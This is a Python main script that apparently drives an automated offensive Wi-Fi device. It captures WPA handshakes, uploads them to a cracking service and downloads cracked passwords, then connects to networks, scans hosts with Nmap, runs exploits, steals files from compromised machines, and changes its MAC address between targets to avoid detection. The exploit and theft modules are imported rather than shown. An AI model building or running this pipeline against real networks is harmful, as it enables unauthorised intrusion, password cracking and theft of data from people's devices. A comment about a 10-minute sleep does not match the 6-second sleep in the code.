#!/usr/bin/env python3

import os
import time
from utils.logger import Logger
from services.wifi_service import WifiService
from services.nmap_service import NmapService
from services.recon_service import ReconService
from services.vulnerability_service import VulnerabilityService
from services.exploit_service import ExploitService
from services.file_stealer_service import FileStealerService
from services.log_service import LogService
from services.display_service import DisplayService
from attacks.handshake_harvester import HandshakeHarvester

# Additional imports for WPA‑Sec integration
import json
from services.wpa_sec_service import WpaSecService

def main():
    os.makedirs("logs", exist_ok=True)
    logger = Logger(log_file="logs/scan.log")

    wifi_svc = WifiService(logger=logger)
    wifi_manager = wifi_svc.manager
    nmap_svc = NmapService(wifi_manager, logger=logger)
    recon_svc = ReconService(logger=logger)
    log_svc = LogService()
    vuln_svc = VulnerabilityService(logger=logger, html_logger=log_svc.html_logger)
    exploit_svc = ExploitService(logger=logger, html_logger=log_svc.html_logger)
    thief_svc = FileStealerService(wifi_service=wifi_svc, logger=logger)
    display_svc = DisplayService()
    display_svc.initialize()

    # -------------------------------------------------------------------------
    # WPA‑Sec integration setup
    # -------------------------------------------------------------------------
    # Attempt to load WPA‑Sec configuration.  The user can supply an
    # ``api_key`` (and optionally ``api_url``) via a JSON file at
    # ``config/wpasec_config.json``.  If no file is found or the key is
    # missing, WPA‑Sec integration will be disabled gracefully.  We
    # wrap this in a try/except block so that malformed JSON or other
    # errors do not crash the program.  When integration is enabled
    # ``wpasec_client`` will hold an instance of WpaSecService, otherwise
    # it will remain None.
    wpasec_client = None
    wpasec_cfg_path = os.path.join("config", "wpasec_config.json")
    try:
        if os.path.exists(wpasec_cfg_path):
            with open(wpasec_cfg_path, "r") as fh:
                cfg = json.load(fh)
            api_key = cfg.get("api_key")
            api_url = cfg.get("api_url", "https://wpa-sec.stanev.org")
            if api_key:
                wpasec_client = WpaSecService(api_key=api_key, api_url=api_url)
                logger.log("[INFO] WPA‑Sec integration enabled.")
            else:
                logger.log("[WARNING] WPA‑Sec config found but missing 'api_key'; integration disabled.")
        else:
            logger.log("[INFO] WPA‑Sec config not found; skipping integration.")
    except Exception as exc:
        logger.log(f"[WARNING] Failed to load WPA‑Sec config: {exc}. WPA‑Sec integration disabled.")
        wpasec_client = None

    wifi_creds = wifi_svc.load_credentials()
    if not wifi_creds:
        logger.log("[ERROR] No Wi-Fi credentials found, exiting.")
        return

    try:
        while True:
            for net in wifi_creds:
                ssid = net.get("SSID")
                pwd = net.get("Password")
                if not ssid or not pwd:
                    continue

                stats = {"targets": 0, "vulns": 0, "exploits": 0, "files": 0}

                # --- 0) Passive Handshake Capture ---
                display_svc.update(
                    state="handshake_capture",
                    ssid=ssid,
                    status="Capturing handshakes...",
                    stats=stats,
                    partial=False,

                )

                harvester = HandshakeHarvester(logger=logger)
                # Capture handshakes and determine if a .cap file was produced.
                ap_count, selected_iface, handshake_captured = harvester.capture_handshakes(
                    wifi_manager.interface,
                    ssid
                )

                # Path of the handshake capture file for this SSID.  We know
                # that handshake files are named ``{ssid}_handshake-01.cap``
                # and stored under ``logs/handshakes`` by the harvester.
                cap_path = os.path.join(
                    "logs", "handshakes",
                    f"{ssid.replace(' ', '_')}_handshake-01.cap"
                )

                # If WPA‑Sec is enabled and a handshake was captured, try to
                # upload the .cap file.  We do this before updating the
                # handshake counter so that already-submitted captures are
                # silently skipped by the service.  Upload errors are
                # logged but do not halt the workflow.
                if wpasec_client and handshake_captured and os.path.exists(cap_path):
                    try:
                        uploaded = wpasec_client.upload_handshake(cap_path)
                        if uploaded:
                            logger.log(f"[INFO] Uploaded handshake to WPA‑Sec: {cap_path}")
                        else:
                            logger.log(f"[INFO] Handshake already submitted or upload skipped: {cap_path}")
                    except Exception as exc:
                        logger.log(f"[WARNING] WPA‑Sec upload failed: {exc}")

                # Update and persist the handshake count when a new
                # handshake has been captured.  This must occur
                # before the stats dictionary is displayed so that
                # the user sees the updated count on the e‑ink display.
                if handshake_captured:
                    # Increment the persistent counter and retrieve the
                    # running total.  The DisplayService maintains the
                    # ImageStateManager instance used for storing the
                    # handshake count.
                    display_svc.state_mgr.increment_handshakes()
                    total_handshakes = display_svc.state_mgr.get_handshakes()
                    # Record the event in the HTML/JSON logs for this SSID.
                    log_svc.append_handshake(ssid, total_handshakes)
                    # Add the handshake count to the stats for display
                    stats["handshakes"] = total_handshakes
                    # Inform the user via the e‑ink display that a
                    # handshake has been captured.  Use the
                    # 'handshake_capture' state so that Xeno shows
                    # the appropriate animation; include the updated
                    # handshake total in the status message.
                    display_svc.update(
                        state="handshake_capture",
                        ssid=ssid,
                        status=f"Captured handshake (total {total_handshakes})",
                        stats=stats,
                        partial=False
                    )
                else:
                    # Ensure handshake count still appears on the
                    # display even if no new capture occurred.
                    stats["handshakes"] = display_svc.state_mgr.get_handshakes()

                # --- Choose interface for connection based on handshake harvester suggestion ---
                # `selected_iface` returned from the harvester indicates which
                # base interface (wlan0 or wlan1) should be used after
                # monitor mode is torn down.  Honour that recommendation
                # instead of forcing wlan1 if it merely exists.
                if os.path.exists(f"/sys/class/net/{selected_iface}"):
                    wifi_manager.interface = selected_iface
                    logger.log(f"[INFO] Using interface {selected_iface} for connection phase.")
                else:
                    # Fallback to wlan0 if the recommended interface is missing
                    logger.log(f"[WARNING] {selected_iface} not found after handshake. Falling back to wlan0.")
                    wifi_manager.interface = "wlan0"

                if ap_count == 0:
                    logger.log("[WARNING] No APs found, skipping handshake phase and continuing workflow.")
                    continue

                # --- 1) Connect ---
                display_svc.update(state="scanning", ssid=ssid, status="Connecting to Wi-Fi", stats=stats, partial=True)
                if not wifi_svc.connect(ssid, pwd):
                    display_svc.update(
                        state="fallback",
                        ssid=ssid,
                        status="Connection failed, next...",
                        stats=stats,
                        partial=True
                    )
                    continue

                # After a successful connection, attempt to download and
                # process the WPA‑Sec potfile.  We perform this step once
                # per network after establishing connectivity so that
                # previously cracked passwords are logged in the current
                # iteration.  The potfile may contain passwords for
                # networks other than ``ssid``; however ``append_passwords``
                # will filter and log only relevant entries.  Errors are
                # ignored silently so as not to interrupt the workflow.
                if wpasec_client:
                    potfile_path = os.path.join("logs", "handshakes", "wpa-sec.cracked.potfile")
                    try:
                        if wpasec_client.download_potfile(potfile_path):
                            pw_map = wpasec_client.parse_potfile(potfile_path)
                            log_svc.append_passwords(ssid, pw_map)
                    except Exception as exc:
                        logger.log(f"[WARNING] WPA‑Sec download or parse failed: {exc}")

                # --- 2) Discovery ---
                display_svc.update(state="analyzing", ssid=ssid, status="Running Nmap scan", stats=stats, partial=True)
                scan_res = nmap_svc.discover()
                log_svc.save_scan(ssid, scan_res)
                ips = scan_res.get("discovered_ips", [])
                stats["targets"] = len(ips)

                # --- 3) Reconnaissance ---
                display_svc.update(
                    state="reconnaissance",
                    ssid=ssid,
                    status=f"{stats['targets']} host(s) found",
                    stats=stats,
                    partial=True
                )
                devices = recon_svc.enrich_devices(scan_res["raw_output"], ips)
                log_svc.append_recon(ssid, devices)

                # --- 4) Vulnerability Scan ---
                vuln_list = vuln_svc.scan(devices, ssid)
                stats["vulns"] = sum(len(v["vulnerabilities"]) for v in vuln_list)
                log_svc.append_vulns(ssid, vuln_list)
                display_svc.update(
                    state="investigating",
                    ssid=ssid,
                    status=f"{stats['vulns']} vuln(s) found",
                    stats=stats,
                    partial=True
                )

                # --- 5) Exploit Testing ---
                targets = exploit_svc.test(vuln_list, ssid)
                stats["exploits"] = len(targets)
                display_svc.update(
                    state="attacking",
                    ssid=ssid,
                    status=f"Attacking {stats['exploits']} host(s)",
                    stats=stats,
                    partial=True
                )

                # --- 6) File Stealing ---
                stolen = thief_svc.steal(targets)
                stats["files"] = len(stolen)
                if stats["files"] > 0:
                    display_svc.update(
                        state="file_stolen",
                        ssid=ssid,
                        status=f"Stolen from {stats['files']} host(s)",
                        stats=stats,
                        partial=False
                    )
                else:
                    logger.log("[WARNING] File stealing failed: no files exfiltrated.")
                    display_svc.update(
                        state="attacking",
                        ssid=ssid,
                        status="File stealing failed",
                        stats=stats,
                        partial=False
                    )

                # --- 7) Rotate MAC before next SSID ---
                wifi_svc.disconnect()
                wifi_svc.change_mac(interface=wifi_manager.interface)

            display_svc.update(
                state="success",
                ssid="All Networks",
                status="Workflow Complete",
                stats={"targets": 0, "vulns": 0, "exploits": 0, "files": 0},
                partial=False
            )

            logger.log("[INFO] Cycle complete, sleeping for 10 minutes.")
            time.sleep(6)

    except KeyboardInterrupt:
        logger.log("[INFO] Interrupted by user, exiting.")
    except Exception as e:
        logger.log(f"[ERROR] Fatal error: {e}")
    finally:
        try:
            display_svc.clear()
        except Exception as e:
            logger.log(f"[WARNING] Could not clear display: {e}")
        logger.log("[INFO] Display cleared, shutdown complete.")

if __name__ == "__main__":
    main()